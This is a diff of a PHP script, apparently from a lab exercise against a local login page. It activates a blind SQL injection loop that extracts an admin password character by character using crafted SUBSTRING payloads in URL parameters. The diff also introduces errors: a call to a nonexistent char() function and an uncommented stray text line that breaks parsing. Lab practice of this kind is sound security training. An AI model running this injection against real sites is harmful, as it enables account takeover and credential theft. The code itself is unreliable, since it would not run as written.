@@ -11,16 +11,16 @@
 
 
 
-foreach(range(32,126)  as $i) 
+/*foreach(range(32,126)  as $i) 
 { 
     echo "The character equivalent of  
                  ASCII value of ", $i, " is "; 
     echo chr($i), "\n"; 
-} 
+} */
 
 
 
-/* Marche admin final
+Marche admin final
 $size = 0;
 while ($size < 25)
 {
@@ -80,7 +80,8 @@ echo 'password: ';
 
 
 for ($i = 1; $i <= $sizepwd; $i++) {
-    foreach (range(0, 9) as $letter){
+    foreach (range(32,126) as $character){
+    	$letter = char($character);
          //echo "$letter \n";
     	$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
 		$result = file_get_contents($url);
@@ -93,7 +94,7 @@ for ($i = 1; $i <= $sizepwd; $i++) {
 		}
 	}   
 }
-*/
+
 
 
 
